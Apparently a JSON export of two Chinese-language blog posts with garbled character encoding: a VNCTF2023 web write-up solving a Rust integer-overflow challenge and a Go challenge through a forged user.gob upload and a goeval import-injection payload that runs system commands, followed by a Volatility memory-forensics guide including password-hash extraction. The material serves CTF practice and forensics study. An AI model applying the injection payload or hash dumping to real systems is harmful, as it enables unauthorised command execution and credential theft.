[{"content":"ç”µå­æœ¨é±¼ ä¸€é“ç®€å•çš„rustä½†æ˜¯å¥½åƒå’Œrustæ²¡æœ‰å¤ªå¤§çš„å…³ç³»ã€‚å…ˆæ¥çœ‹çœ‹æºç ï¼š\nuse actix_files::Files;\ruse actix_web::{\rerror, get, post,\rweb::{self, Json},\rApp, Error, HttpResponse, HttpServer,\r};\ruse once_cell::sync::Lazy;\ruse serde::{Deserialize, Serialize};\ruse std::sync::{Arc, Mutex};\ruse tera::{Context, Tera};\rstatic GONGDE: Lazy\u0026lt;ThreadLocker\u0026lt;i32\u0026gt;\u0026gt; = Lazy::new(|| ThreadLocker::from(0));\r#[derive(Debug, Clone, Default)]\rstruct ThreadLocker\u0026lt;T\u0026gt; {\rvalue: Arc\u0026lt;Mutex\u0026lt;T\u0026gt;\u0026gt;,\r}\rimpl\u0026lt;T: Clone\u0026gt; ThreadLocker\u0026lt;T\u0026gt; {\rfn get(\u0026amp;self) -\u0026gt; T {\rlet mutex = self.value.lock().unwrap();\rmutex.clone()\r}\rfn set(\u0026amp;self, val: T) {\rlet mut mutex = self.value.lock().unwrap();\r*mutex = val;\r}\rfn from(val: T) -\u0026gt; ThreadLocker\u0026lt;T\u0026gt; {\rThreadLocker::\u0026lt;T\u0026gt; {\rvalue: Arc::new(Mutex::new(val)),\r}\r}\r}\r#[derive(Serialize)]\rstruct APIResult {\rsuccess: bool,\rmessage: \u0026amp;'static str,\r}\r#[derive(Deserialize)]\rstruct Info {\rname: String,\rquantity: i32,\r}\r#[derive(Debug, Copy, Clone, Serialize)]\rstruct Payload {\rname: \u0026amp;'static str,\rcost: i32,\r}\rconst PAYLOADS: \u0026amp;[Payload] = \u0026amp;[\rPayload {\rname: \u0026quot;Cost\u0026quot;,\rcost: 10,\r},\rPayload {\rname: \u0026quot;Loan\u0026quot;,\rcost: -1_000,\r},\rPayload {\rname: \u0026quot;CCCCCost\u0026quot;,\rcost: 500,\r},\rPayload {\rname: \u0026quot;Donate\u0026quot;,\rcost: 1,\r},\rPayload {\rname: \u0026quot;Sleep\u0026quot;,\rcost: 0,\r},\r];\r#[get(\u0026quot;/\u0026quot;)]\rasync fn index(tera: web::Data\u0026lt;Tera\u0026gt;) -\u0026gt; Result\u0026lt;HttpResponse, Error\u0026gt; {\rlet mut context = Context::new();\rcontext.insert(\u0026quot;gongde\u0026quot;, \u0026amp;GONGDE.get());\rif GONGDE.get() \u0026gt; 1_000_000_000 {\rcontext.insert(\r\u0026quot;flag\u0026quot;,\r\u0026amp;std::env::var(\u0026quot;FLAG\u0026quot;).unwrap_or_else(|_| \u0026quot;flag{test_flag}\u0026quot;.to_string()),\r);\r}\rmatch tera.render(\u0026quot;index.html\u0026quot;, \u0026amp;context) {\rOk(body) =\u0026gt; Ok(HttpResponse::Ok().body(body)),\rErr(err) =\u0026gt; Err(error::ErrorInternalServerError(err)),\r}\r}\r#[get(\u0026quot;/reset\u0026quot;)]\rasync fn reset() -\u0026gt; Json\u0026lt;APIResult\u0026gt; {\rGONGDE.set(0);\rweb::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;é‡å¼€æˆåŠŸï¼Œç»§ç»­æŒ‘æˆ˜ä½›ç¥–å§\u0026quot;,\r})\r}\r#[post(\u0026quot;/upgrade\u0026quot;)]\rasync fn upgrade(body: web::Form\u0026lt;Info\u0026gt;) -\u0026gt; Json\u0026lt;APIResult\u0026gt; {\rif GONGDE.get() \u0026lt; 0 {\rreturn web::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;åŠŸå¾·éƒ½ææˆè´Ÿæ•°äº†ï¼Œä½›ç¥–å¯¹ä½ å¾ˆå¤±æœ›\u0026quot;,\r});\r}\rif body.quantity \u0026lt;= 0 {\rreturn web::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;ä½›ç¥–é¢å‰éƒ½æ•¢ä½œå¼Šï¼ŒçœŸä¸æ€•é­æŠ¥åº”å•Š\u0026quot;,\r});\r}\rif let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {\rlet mut cost = payload.cost;\rif payload.name == \u0026quot;Donate\u0026quot; || payload.name == \u0026quot;Cost\u0026quot; {\rcost *= body.quantity;\r}\rif GONGDE.get() \u0026lt; cost as i32 {\rreturn web::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;åŠŸå¾·ä¸è¶³\u0026quot;,\r});\r}\rif cost != 0 {\rGONGDE.set(GONGDE.get() - cost as i32);\r}\rif payload.name == \u0026quot;Cost\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;å°æ‰£ä¸€æ‰‹åŠŸå¾·\u0026quot;,\r});\r} else if payload.name == \u0026quot;CCCCCost\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;åŠŸå¾·éƒ½å¿«æ‰£æ²¡äº†ï¼Œæ€ä¹ˆç¡å¾—ç€çš„\u0026quot;,\r});\r} else if payload.name == \u0026quot;Loan\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;æˆ‘å‘ä½›ç¥–è®¸æ„¿ï¼Œä½›ç¥–å€Ÿæˆ‘åŠŸå¾·ï¼Œå¿«è¯´è°¢è°¢ä½›ç¥–\u0026quot;,\r});\r} else if payload.name == \u0026quot;Donate\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;å¥½äººæœ‰å¥½æŠ¥\u0026quot;,\r});\r} else if payload.name == \u0026quot;Sleep\u0026quot; {\rreturn web::Json(APIResult {\rsuccess: true,\rmessage: \u0026quot;è¿™æ˜¯ä»€ä¹ˆï¼ŸåºŠï¼Œç¡ä¸€ä¸‹\u0026quot;,\r});\r}\r}\rweb::Json(APIResult {\rsuccess: false,\rmessage: \u0026quot;ç¦æ­¢å¼€æ‘†\u0026quot;,\r})\r}\r#[actix_web::main]\rasync fn main() -\u0026gt; std::io::Result\u0026lt;()\u0026gt; {\rlet port = std::env::var(\u0026quot;PORT\u0026quot;)\r.unwrap_or_else(|_| \u0026quot;2333\u0026quot;.to_string())\r.parse()\r.expect(\u0026quot;Invalid PORT\u0026quot;);\rprintln!(\u0026quot;Listening on 0.0.0.0:{}\u0026quot;, port);\rHttpServer::new(move || {\rlet tera = match Tera::new(\u0026quot;src/templates/**/*.html\u0026quot;) {\rOk(t) =\u0026gt; t,\rErr(e) =\u0026gt; {\rprintln!(\u0026quot;Error: {}\u0026quot;, e);\r::std::process::exit(1);\r}\r};\rApp::new()\r.app_data(web::Data::new(tera))\r.service(Files::new(\u0026quot;/asset\u0026quot;, \u0026quot;src/templates/asset/\u0026quot;).prefer_utf8(true))\r.service(index)\r.service(upgrade)\r.service(reset)\r})\r.bind((\u0026quot;0.0.0.0\u0026quot;, port))?\r.run()\r.await\r}\rå®¡è®¡å®Œä¹‹åå‘ç°GONGDEèƒ½å¤Ÿå¤§äº1_000_000_000å°±ç»™flagã€‚å…³é”®ä»£ç åœ¨è¿™é‡Œ\nif cost != 0 {\rGONGDE.set(GONGDE.get() - cost as i32);\r}\rå¦‚æœèƒ½å¤Ÿè®©costæˆä¸ºä¸€ä¸ªå¤§è´Ÿæ•°ï¼Œå°±å¯ä»¥æ§åˆ¶GONGDEæˆä¸ºä¸€ä¸ªå¤§æ­£æ•°ã€‚ç»“åˆåé¢çš„i32ï¼Œå¯ä»¥æƒ³åˆ°æ•´æ•°æº¢å‡ºï¼Œæ‰€ä»¥ç°åœ¨çš„ç›®çš„æ˜¯è®©costè¶³å¤Ÿå¤§ã€‚\næ§åˆ¶costçš„ä»£ç ï¼š\nif payload.name == \u0026quot;Donate\u0026quot; || payload.name == \u0026quot;Cost\u0026quot; {\rcost *= body.quantity;\r}\rquantityæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å˜é‡ä¹‹ä¸€ã€‚é‚£ä¹ˆå½“quantityè¶³å¤Ÿå¤§æ—¶ï¼ˆæ¯”å¦‚å¤§äº2147283647ï¼‰ï¼Œcostå°±ä¼šäº§ç”Ÿæº¢å‡ºã€‚\nå› æ­¤æœ€ç»ˆä¼ å…¥name=Cost\u0026amp;quantity=214748365æ—¶ä¼šä½¿costæº¢å‡ºåˆ°-2147483646ï¼Œä»è€Œä½¿GONGDEæˆä¸ºè¾ƒå¤§çš„æ­£æ•°ã€‚\nè¿™é‡Œæ³¨æ„ï¼Œå¦‚æœä¼ å…¥çš„quantity=2147483648ï¼Œä¹Ÿå°±æ˜¯åˆšå¥½å¤§äºi32æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›Parse error: number too large to fit in target type.å‚è€ƒä¸‹é¢çš„è§£é‡Šï¼ˆå¤§æ¦‚ï¼‰\nimage-20230228100743212\rBabyGo ç®€å•çš„Goæ²™ç®±é€ƒé€¸\nçœ‹çœ‹æºç \npackage main\rimport (\r\u0026quot;encoding/gob\u0026quot;\r\u0026quot;fmt\u0026quot;\r\u0026quot;github.com/PaulXu-cn/goeval\u0026quot;\r\u0026quot;github.com/duke-git/lancet/cryptor\u0026quot;\r\u0026quot;github.com/duke-git/lancet/fileutil\u0026quot;\r\u0026quot;github.com/duke-git/lancet/random\u0026quot;\r\u0026quot;github.com/gin-contrib/sessions\u0026quot;\r\u0026quot;github.com/gin-contrib/sessions/cookie\u0026quot;\r\u0026quot;github.com/gin-gonic/gin\u0026quot;\r\u0026quot;net/http\u0026quot;\r\u0026quot;os\u0026quot;\r\u0026quot;path/filepath\u0026quot;\r\u0026quot;strings\u0026quot;\r)\rtype User struct {\rName string\rPath string\rPower string\r}\rfunc main() {\rr := gin.Default()\rstore := cookie.NewStore(random.RandBytes(16))\rr.Use(sessions.Sessions(\u0026quot;session\u0026quot;, store))\rr.LoadHTMLGlob(\u0026quot;template/*\u0026quot;)\rr.GET(\u0026quot;/\u0026quot;, func(c *gin.Context) {\ruserDir := \u0026quot;./\u0026quot; + cryptor.Md5String(c.ClientIP()+\u0026quot;VNCTF2023GoGoGo~\u0026quot;) + \u0026quot;/\u0026quot;\rsession := sessions.Default(c)\rsession.Set(\u0026quot;shallow\u0026quot;, userDir)\rsession.Save()\rfileutil.CreateDir(userDir)\rgobFile, _ := os.Create(userDir + \u0026quot;user.gob\u0026quot;)\ruser := User{Name: \u0026quot;ctfer\u0026quot;, Path: userDir, Power: \u0026quot;low\u0026quot;}\rencoder := gob.NewEncoder(gobFile)\rencoder.Encode(user)\rif fileutil.IsExist(userDir) \u0026amp;\u0026amp; fileutil.IsExist(userDir+\u0026quot;user.gob\u0026quot;) {\rc.HTML(200, \u0026quot;index.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;Your path: \u0026quot; + userDir})\rreturn\r}\rc.HTML(500, \u0026quot;index.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;failed to make user dir\u0026quot;})\r})\rr.GET(\u0026quot;/upload\u0026quot;, func(c *gin.Context) {\rc.HTML(200, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;upload me!\u0026quot;})\r})\rr.POST(\u0026quot;/upload\u0026quot;, func(c *gin.Context) {\rsession := sessions.Default(c)\rif session.Get(\u0026quot;shallow\u0026quot;) == nil {\rc.Redirect(http.StatusFound, \u0026quot;/\u0026quot;)\r}\ruserUploadDir := session.Get(\u0026quot;shallow\u0026quot;).(string) + \u0026quot;uploads/\u0026quot;\rfileutil.CreateDir(userUploadDir)\rfile, err := c.FormFile(\u0026quot;file\u0026quot;)\rif err != nil {\rc.HTML(500, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;no file upload\u0026quot;})\rreturn\r}\rext := file.Filename[strings.LastIndex(file.Filename, \u0026quot;.\u0026quot;):]\rif ext == \u0026quot;.gob\u0026quot; || ext == \u0026quot;.go\u0026quot; {\rc.HTML(500, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;Hacker!\u0026quot;})\rreturn\r}\rfilename := userUploadDir + file.Filename\rif fileutil.IsExist(filename) {\rfileutil.RemoveFile(filename)\r}\rerr = c.SaveUploadedFile(file, filename)\rif err != nil {\rc.HTML(500, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;failed to save file\u0026quot;})\rreturn\r}\rc.HTML(200, \u0026quot;upload.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;file saved to \u0026quot; + filename})\r})\rr.GET(\u0026quot;/unzip\u0026quot;, func(c *gin.Context) {\rsession := sessions.Default(c)\rif session.Get(\u0026quot;shallow\u0026quot;) == nil {\rc.Redirect(http.StatusFound, \u0026quot;/\u0026quot;)\r}\ruserUploadDir := session.Get(\u0026quot;shallow\u0026quot;).(string) + \u0026quot;uploads/\u0026quot;\rfiles, _ := fileutil.ListFileNames(userUploadDir)\rdestPath := filepath.Clean(userUploadDir + c.Query(\u0026quot;path\u0026quot;))\rfor _, file := range files {\rif fileutil.MiMeType(userUploadDir+file) == \u0026quot;application/zip\u0026quot; {\rerr := fileutil.UnZip(userUploadDir+file, destPath)\rif err != nil {\rc.HTML(200, \u0026quot;zip.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;failed to unzip file\u0026quot;})\rreturn\r}\rfileutil.RemoveFile(userUploadDir + file)\r}\r}\rc.HTML(200, \u0026quot;zip.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;success unzip\u0026quot;})\r})\rr.GET(\u0026quot;/backdoor\u0026quot;, func(c *gin.Context) {\rsession := sessions.Default(c)\rif session.Get(\u0026quot;shallow\u0026quot;) == nil {\rc.Redirect(http.StatusFound, \u0026quot;/\u0026quot;)\r}\ruserDir := session.Get(\u0026quot;shallow\u0026quot;).(string)\rif fileutil.IsExist(userDir + \u0026quot;user.gob\u0026quot;) {\rfile, _ := os.Open(userDir + \u0026quot;user.gob\u0026quot;)\rdecoder := gob.NewDecoder(file)\rvar ctfer User\rdecoder.Decode(\u0026amp;ctfer)\rif ctfer.Power == \u0026quot;admin\u0026quot; {\reval, err := goeval.Eval(\u0026quot;\u0026quot;, \u0026quot;fmt.Println(\\\u0026quot;Good\\\u0026quot;)\u0026quot;, c.DefaultQuery(\u0026quot;pkg\u0026quot;, \u0026quot;fmt\u0026quot;))\rif err != nil {\rfmt.Println(err)\r}\rc.HTML(200, \u0026quot;backdoor.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: string(eval)})\rreturn\r} else {\rc.HTML(200, \u0026quot;backdoor.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;low power\u0026quot;})\rreturn\r}\r} else {\rc.HTML(500, \u0026quot;backdoor.html\u0026quot;, gin.H{\u0026quot;message\u0026quot;: \u0026quot;no such user gob\u0026quot;})\rreturn\r}\r})\rr.Run(\u0026quot;:80\u0026quot;)\r}\rå…·ä½“æ€è·¯æ˜¯é€šè¿‡ä¸Šä¼ åŒ…å«user.gobçš„zipå‹ç¼©åŒ…ï¼Œç„¶åè®¿é—®unzipè®©å…¶è§£å‹åˆ°å¯¹åº”ç›®å½•ä¸‹é¢ï¼Œæœ€åé€šè¿‡è®¿é—®backdoorï¼Œåˆ¤æ–­user.gobå†…å«çš„userä¿¡æ¯æ˜¯å¦æ˜¯adminï¼Œå¦‚æœæ˜¯adminå°±è¿›å…¥evalè¿›è¡Œrceã€‚\nç®€å•è®°å½•ä¸€ä¸‹goevalçš„rce æ‹¿åˆ°goevalçš„æºç ï¼š\npackage goeval\rimport (\r\u0026quot;fmt\u0026quot;\r\u0026quot;go/format\u0026quot;\r\u0026quot;math/rand\u0026quot;\r\u0026quot;os\u0026quot;\r\u0026quot;os/exec\u0026quot;\r\u0026quot;strings\u0026quot;\r\u0026quot;time\u0026quot;\r)\rconst (\rletterBytes = \u0026quot;abcdefghijklmnopqrstuvwxyz\u0026quot;\rletterIdxBits = 6 // 6 bits to represent a letter index\rletterIdxMask = 1\u0026lt;\u0026lt;letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\rletterIdxMax = 63 / letterIdxBits // # of letter indices fitting in 63 bits\r)\rvar (\rdirSeparator = \u0026quot;/\u0026quot;\rtempDir = os.TempDir()\rsrc = rand.NewSource(time.Now().UnixNano())\r)\r// å‚è€ƒï¼š https://colobu.com/2018/09/02/generate-random-string-in-Go/\rfunc RandString(n int) string {\rb := make([]byte, n)\r// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!\rfor i, cache, remain := n-1, src.Int63(), letterIdxMax; i \u0026gt;= 0; {\rif remain == 0 {\rcache, remain = src.Int63(), letterIdxMax\r}\rif idx := int(cache \u0026amp; letterIdxMask); idx \u0026lt; len(letterBytes) {\rb[i] = letterBytes[idx]\ri--\r}\rcache \u0026gt;\u0026gt;= letterIdxBits\rremain--\r}\rreturn string(b)\r}\rfunc Eval(defineCode string, code string, imports ...string) (re []byte, err error) {\rvar (\rtmp = `package main\r%s\r%s\rfunc main() {\r%s\r}\r`\rimportStr string\rfullCode string\rnewTmpDir = tempDir + dirSeparator + RandString(8)\r)\rif 0 \u0026lt; len(imports) {\rimportStr = \u0026quot;import (\u0026quot;\rfor _, item := range imports {\rif blankInd := strings.Index(item, \u0026quot; \u0026quot;); -1 \u0026lt; blankInd {\rimportStr += fmt.Sprintf(\u0026quot;\\n %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, item[:blankInd], item[blankInd+1:])\r} else {\rimportStr += fmt.Sprintf(\u0026quot;\\n\\\u0026quot;%s\\\u0026quot;\u0026quot;, item)\r}\r}\rimportStr += \u0026quot;\\n)\u0026quot;\r}\rfullCode = fmt.Sprintf(tmp, importStr, defineCode, code)\rvar codeBytes = []byte(fullCode)\r// æ ¼å¼åŒ–è¾“å‡ºçš„ä»£ç \rif formatCode, err := format.Source(codeBytes); nil == err {\r// æ ¼å¼åŒ–å¤±è´¥ï¼Œå°±è¿˜æ˜¯ç”¨ content å§\rcodeBytes = formatCode\r}\r// åˆ›å»ºç›®å½•\rif err = os.Mkdir(newTmpDir, os.ModePerm); nil != err {\rreturn\r}\rdefer os.RemoveAll(newTmpDir)\r// åˆ›å»ºæ–‡ä»¶\rtmpFile, err := os.Create(newTmpDir + dirSeparator + \u0026quot;main.go\u0026quot;)\rif err != nil {\rreturn re, err\r}\rdefer os.Remove(tmpFile.Name())\r// ä»£ç å†™å…¥æ–‡ä»¶\rtmpFile.Write(codeBytes)\rtmpFile.Close()\r// è¿è¡Œä»£ç \rcmd := exec.Command(\u0026quot;go\u0026quot;, \u0026quot;run\u0026quot;, tmpFile.Name())\rres, err := cmd.CombinedOutput()\rreturn res, err\r}\rå…³é”®ä»£ç ï¼š\nvar (\rtmp = `package main\r%s\r%s\rfunc main() {\r%s\r}\r`\rimportStr string\rfullCode string\rnewTmpDir = tempDir + dirSeparator + RandString(8)\r)\rif 0 \u0026lt; len(imports) {\rimportStr = \u0026quot;import (\u0026quot;\rfor _, item := range imports {\r// ç¢°åˆ°ç¬¬ä¸€ä¸ªç©ºæ ¼å°±åœ¨å®ƒåé¢åŠ åŒå¼•å·\rif blankInd := strings.Index(item, \u0026quot; \u0026quot;); -1 \u0026lt; blankInd {\rimportStr += fmt.Sprintf(\u0026quot;\\n %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, item[:blankInd], item[blankInd+1:])\r} else {\rimportStr += fmt.Sprintf(\u0026quot;\\n\\\u0026quot;%s\\\u0026quot;\u0026quot;, item)\r}\r}\rimportStr += \u0026quot;\\n)\u0026quot;\r}\rfullCode = fmt.Sprintf(tmp, importStr, defineCode, code)\rè¿™é‡Œæ˜¯å°†ä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ°tmpå­—ç¬¦ä¸²ä¸­ï¼Œç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„goæ–‡ä»¶ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥æ‹¼æ¥ä»£ç è¿›å»å®ç°rceã€‚\næ„é€ å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å®Œæ•´goæ–‡ä»¶ï¼š\npackage main\rimport (\r\u0026quot;os/exec\u0026quot;\r\u0026quot;fmt\u0026quot;\r)\rfunc init(){\rcmd := exec.Command(\u0026quot;ls\u0026quot;,\u0026quot;/\u0026quot;)\rres,err := cmd.CombinedOutput()\rfmt.Println(string(res))\rfmt.Println(err)\r}\rç”±äºtmpé‡Œé¢å·²ç»æœ‰mainå‡½æ•°ï¼Œä¸”å‡½æ•°æ‰§è¡Œçš„ä»£ç æ˜¯æˆ‘ä»¬ä¸å¯æ§çš„ï¼Œå› æ­¤è‡ªè¡Œæ‹¼æ¥ä¸€ä¸ªinitå‡½æ•°ï¼Œè®©å…¶åœ¨mainå‡½æ•°ä¹‹å‰è¢«æ‰§è¡Œã€‚åŒæ—¶ä¸ºäº†é—­åˆevalç»™å‡ºçš„å¼•å·ï¼Œå¯¹è¿™ä¸€æ®µä»£ç è¿›è¡Œä¿®æ”¹ï¼Œç»™å‡ºå¦‚ä¸‹expï¼š\nos/exec\\\u0026quot;\\n\\\u0026quot;fmt\\\u0026quot;)\\nfunc\\tinit(){\\ncmd\\t:=exec.Command(\\\u0026quot;ls\\\u0026quot;,\\\u0026quot;/\\\u0026quot;)\\nres,err\\t:=\\tcmd.CombinedOutput()\\nfmt.Println(string(res))\\nfmt.Println(err)\\n}\\nconst(\\nMessage=\\\u0026quot;fmt\råœ¨webä¼ å‚çš„æ—¶å€™è®°å¾—urlç¼–ç ã€‚\nåæ§½\u0026amp;ç¢ç¢å¿µ rustç¯å¢ƒçœŸéš¾è£…ï¼Œè£…å®Œå‘ç°ç”¨ä¸åˆ°ã€‚\nè¿˜æœ‰ä¸€é“phpæ®è¯´å¾ˆéš¾å°±æ²¡åš23333\næœ€è¿‘å¤ªç„¦è™‘äº†ï¼Œå¿ƒåˆæµ®èºçš„å¾ˆï¼Œåœ¨æ€è€ƒè¯¥æ€ä¹ˆå†·é™ä¸‹æ¥\nä»¥åŠè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°secretï¼Œå´©æºƒ.jpg\n","date":"2023-03-01T13:34:39+08:00","permalink":"https://koali-www.github.io/2023/vnctf2023web/","title":"VNCTF2023-Web"},{"content":"ä¸ºäº†åšwindowså†…å­˜å–è¯çš„é¢˜ï¼Œæ£é¼“äº†ä¸€ä¸‹volatilityï¼Œä¸­é€”ç¢°åˆ°ä¹±ä¸ƒå…«ç³Ÿçš„é—®é¢˜ï¼Œè¿™é‡Œç¨å¾®è®°å½•ä¸€ä¸‹(â—\u0026rsquo;â—¡\u0026rsquo;â—)\nä½¿ç”¨\u0026amp;å®‰è£…volatilityå‡ºç°çš„ä¸€äº›é—®é¢˜ æ‰“åŒ…å¥½çš„.exeæ–‡ä»¶åœ¨windowsä¸Šè¿è¡Œæ—¶ä¼šæŠ¥é”™ï¼šPlease install PILï¼Œä½†æˆ‘çš„python2æ˜¯è£…å¥½pillowåŒ…äº†çš„ã€‚ä½†å…¶å®å¦‚æœä¸ç”¨åˆ°PILç›¸å…³çš„æ’ä»¶ï¼Œä½¿ç”¨ä¸Šæ²¡æœ‰å¤ªå¤§é—®é¢˜ã€‚\nimage-20230212210040516\råœ¨windowsä¸Šç›´æ¥ä½¿ç”¨æºç ï¼Œä¼šå¯¼è‡´å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜å‡ºç°ï¼Œæ¯”å¦‚å·²ç»è£…å¥½äº†CrptoåŒ…ä½†æ˜¯å‘Šè¯‰æˆ‘æ²¡æœ‰è¿™ä¸ªåŒ…ã€‚\nimage-20230212205730131\rimage-20230212205916461\rdebiané‡Œç›´æ¥ç”¨aptè£…volatilityå¤±è´¥\nimage-20230212210234444\råæ¥å‘ç°volatility2.6åªæ”¯æŒ2.6.11åˆ°5.5çš„linuxå†…æ ¸ï¼ˆäººå®¶å†™readmeäº†æ˜¯æˆ‘æ²¡çœ‹å‘œå‘œï¼‰\nimage-20230212210527864\ræ€»ç»“æ˜¯ï¼šç»å¯¹ä¸è¦åœ¨windowsä¸Šç©volatility\nä»å®‰è£…python2åˆ°volatility2.6 1.debianå®‰è£…python2 æœ¬åœ°è£…åœ¨debian11é‡Œé¢ï¼Œå› ä¸ºdebian11å·²ç»æ‰¾ä¸åˆ°pip2è¿™ä¸ªåŒ…äº†ï¼Œæ‰€ä»¥è¦å¦å¤–è£…orz\nå¦‚æœæ˜¯å…¶ä»–å‘è¡Œç‰ˆlinuxï¼Œè‡ªè¡Œä¸Šç½‘æ‰¾æ•™ç¨‹å­( â€¢Ì€ Ï‰ â€¢Ì )âœ§\nsed -i \u0026quot;s@http://[^/]*@http://mirrors.tuna.tsinghua.edu.cn@g\u0026quot; /etc/apt/sources.list #æ¢æºï¼Œå¦‚æœæ¢è¿‡äº†å°±è·³è¿‡\rsudo apt-get install python2 #è£…python2\rpython2 -V #æµ‹è¯•python2æ˜¯ä¸æ˜¯è£…å¥½äº†\rcurl -o get-pip.py https://bootstrap.pypa.io/pip/2.7/get-pip.py\rpython2 get-pip.py #æ²¡æœ‰æŠ¥é”™çš„è¯åº”è¯¥æ˜¯è£…å¥½äº†\rpip2 -V #æµ‹è¯•pip2æ˜¯ä¸æ˜¯è£…å¥½äº†\r2.å®‰è£…volatility è¿™é‡Œä¼šæ¶‰åŠåˆ°python2å‡ ä¸ªåŒ…çš„å®‰è£…ï¼Œå¦‚æœå·²ç»æœ‰äº†å¯ä»¥è·³è¿‡\n# å®‰è£…CryptoåŒ…ï¼Œæ³¨æ„ä¸è¦ç›´æ¥è£…Crypto!!!!!\rpip2 install pycryptodome # è£…distorm3çš„æ—¶å€™å¦‚æœæŠ¥'Python.h: No such file or directory',æ˜¯ç¯å¢ƒé‡Œæ²¡æœ‰è¿™ä¸ªå¤´æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è£…ä¸€ä¸‹ã€‚\rsudo apt-get install python-dev\rpip2 install distorm3 # æ’ä»¶é‡Œä¼šéœ€è¦PILåŒ…,ä½†è¿™ä¸ªåŒ…å·²ç»æ”¹åå­—äº†,ç¨å¾®æ³¨æ„ä¸€ä¸‹\rpip2 install pillow\réœ€è¦çš„ä¾èµ–éƒ½å®‰è£…å®Œä»¥åï¼Œå»å®˜ç½‘æŠŠæºç æ‹¿ä¸‹æ¥\ngit clone git@github.com:volatilityfoundation/volatility.git\rcd volatility\rpython2 vol.py -h # å¦‚æœä¸æŠ¥ä»»ä½•é”™çš„è¯åº”è¯¥æ˜¯å¯ä»¥ç”¨äº†\rimage-20230212150412325\r3.volatilityçš„ç®€å•ä½¿ç”¨ï¼ˆé’ˆå¯¹windowså†…å­˜å–è¯åˆ†æï¼‰ python2 vol.py -h # æŸ¥çœ‹help\rpython2 vol.py -f memory.mem imageinfo # -fæŒ‡å®šé•œåƒæ–‡ä»¶ï¼Œimageinfoå‚æ•°æŸ¥çœ‹è¯¥é•œåƒçš„æ¦‚å†µ\rpython2 vol.py -f memory.mem --profile=Win7SP1x64 # æŒ‡å®šé•œåƒç‰ˆæœ¬ï¼Œæ–¹ä¾¿åç»­åˆ†æ\råœ¨æ­¤åŸºç¡€ä¸Šï¼Œåˆ—å‡ºå¸¸ç”¨å‚æ•°â€”â€”\n0x01 åˆ—å‡ºè¿›ç¨‹ å¦‚æœæŒ‡å®šç‰ˆæœ¬æ˜¯æ­£ç¡®çš„ï¼Œä½¿ç”¨pslistä¼šåˆ—å‡ºå½“å‰é•œåƒçš„è¿›ç¨‹\npython2 vol.py -f memory.mem --profile=Win7SP1x64 pslist\råŒæ—¶å¯ä»¥ä½¿ç”¨pstreeè¯†åˆ«å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹ã€‚\nä¹‹åå¯ä»¥ä½¿ç”¨memdumpè¿›è¡Œè¿›ç¨‹æå–ï¼Œ-pæŒ‡å®šPIDï¼Œ-DæŒ‡å®šæ–‡ä»¶ä¿å­˜è·¯å¾„\npython2 vol.py -f memory.mem --profile=Win7SP1x64 memdump -p233 -D ./\r0x02 æ‰«æå†å²cmdå‘½ä»¤ python2 vol.py -f memory.mem --profile=Win7SP1x64 cmdscan\r0x03 æ‰«ææ–‡ä»¶ æ‰«æé•œåƒä¸­å­˜åœ¨çš„æ–‡ä»¶ï¼Œä¸€èˆ¬é…åˆgrepä½¿ç”¨\npython2 vol.py -f memory.mem --profile=Win7SP1x64 filescan | grep flag\ræ‰«æåˆ°ä¹‹åä¼šåˆ—å‡ºæ–‡ä»¶åœ°å€ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡dumpfilesæå–\npython2 vol.py -f memory.mem --profile=Win7SP1x64 dumpfiles -Q [æ–‡ä»¶åœ°å€] -D ./\r0x04 è·å–ç”¨æˆ·ä¿¡æ¯åŠå¯†ç  è·å–æœºå™¨ä¸Šå­˜åœ¨çš„ç”¨æˆ·\npython2 vol.py -f memory.mem --profile=Win7SP1x64 printkey -K \u0026quot;SAM\\Domains\\Account\\Users\\Names\u0026quot;\ræœ€åç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·\npython2 vol.py -f memory.mem --profile=Win7SP1x64 printkey -K \u0026quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026quot;\rå¯ä»¥ç›´æ¥æ‹¿åˆ°é•œåƒçš„å¯†ç hash\npython2 vol.py -f memory.mem --profile=Win7SP1x64 hashdump\r0x05 è°ƒå–shell python2 vol.py -f memory.mem --profile=Win7SP1x64 volshell\r0x06 å±å¹•æˆªå›¾ python2 vol.py -f memory.mem --profile=Win7SP1x86 screenshot -D 